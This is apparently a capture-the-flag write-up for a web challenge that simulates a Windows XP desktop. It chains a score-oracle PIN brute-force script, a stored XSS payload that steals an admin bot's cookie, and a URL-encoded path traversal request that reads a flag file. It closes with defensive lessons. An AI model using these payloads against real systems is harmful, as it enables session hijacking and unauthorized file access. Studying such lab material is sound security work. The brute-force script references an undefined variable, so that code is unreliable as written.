# HOLD IT!

**Competition:** ITSCyberGame <br>
**Category:** Web <br>
**Service:** `sfide.itscybergame.it:<port_number>`

---

## Description

> "HOLD IT! ... (OK... now I got something, I promise)"

A web app simulates a Windows XP desktop. The goal is to recover an evidence file hidden on the system.

---

## Solution

### 1. Recon

The root `/` serves an Objection.lol (Ace Attorney) player with inline JS that, at the end of the scene, unlocks a button redirecting to `/login-page`:

```javascript
const LAST_LINE = "Maybe I should tell my colleague to check the victim's computer!";
const TARGET_URL = "/login-page";
// when the string appears in DOM → show button → redirect to /login-page
```

Visiting `/login-page` directly shows an XP-style login asking for an 8-digit numeric PIN.

### 2. PIN brute-force via score oracle

POSTs to `/login` return JSON with a `score` field:

```json
{"debug":"checksum mismatch","score":184,"status":"wrong"}
```

`score` measures distance from the correct PIN: lower means closer. This enables a greedy digit-by-digit optimization: fix each position to the digit that minimizes `score`.

Example attack:

```python
import requests

base = 'http://sfide.itscybergame.it:<port_number>'
best_pin = '44444444'  # starting point

for position in range(8):
    best_score = current_score
    best_digit = int(best_pin[position])
    for digit in range(10):
        candidate = best_pin[:position] + str(digit) + best_pin[position+1:]
        r = requests.post(f'{base}/login', json={'pin': candidate})
        score = r.json().get('score', 999)
        if r.json().get('status') == 'ok':
            print(f"PIN found: {candidate}")
            exit()
        if score < best_score:
            best_score, best_digit = score, digit
    best_pin = best_pin[:position] + str(best_digit) + best_pin[position+1:]
```

Found PIN: `53817429`

### 3. Desktop enumeration

After login `/desktop` shows a simulated XP desktop with five windows:
- **Internet Explorer** (`/browser/{page}`) — tabs: `home`, `notes`, `admin`
- **My Documents** — files: `browser_history.txt`, `passwords.txt`, `work_notes.doc`
- **Notepad** — text: "PIN updated after last meeting... maybe related to that strange sequence..."
- **Recycle Bin**, **Control Panel**

The `/browser/admin` tab returns 403 for normal users. `/browser/home` contains the hint: "Legacy formatting filter disabled after complaints."

### 4. Stored XSS → cookie theft

`/browser/notes` accepts POSTed notes and renders them without sanitization (filter disabled). The victim `tom` notes that admin reviews all submissions. An admin bot reads notes and replies, so a stored XSS can exfiltrate the admin cookie by posting a note that the bot will fetch and resubmit.

Injected payload to send the cookie back to the server as a note:

```html
<script>
fetch('/browser/notes', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'note=COOKIE:' + encodeURIComponent(document.cookie)
});
</script>
```

When the admin bot processes notes, a new note appears containing the admin cookie:

```
[admin] - note #11: ADMIN COOKIE: auth=admin-super-token-7f4e9c
```

### 5. Path traversal → flag

With the admin cookie we can access `/browser/admin`, which exposes an archive viewer with files under `/data/admin_files/` and a `file` parameter for `admin/view`.

`file` blocks literal `../` (400 Blocked) but does not validate URL-encoded characters. Bypass by encoding slashes:

```
GET /admin/view?file=..%2fevidence%2fflag.txt
Cookie: auth=admin-super-token-7f4e9c
```

The server decodes `%2f` → `/` before path resolution, bypasses the naive filter, and returns `/data/evidence/flag.txt`.

---

## Flag

```
flag{...}
```

---

## Conclusions

This challenge chains three vulnerabilities:

1. **Score oracle on login:** returning a distance score reduces brute-force complexity from 10^8 to a few dozen requests via greedy optimization.
2. **Stored XSS:** the notes form renders HTML unsafely; the admin bot becomes an execution vector to steal privileged cookies.
3. **Path traversal via URL encoding:** blocking `../` in raw input is insufficient — validation must occur after decoding. Sanitize and canonicalize paths before resolving.
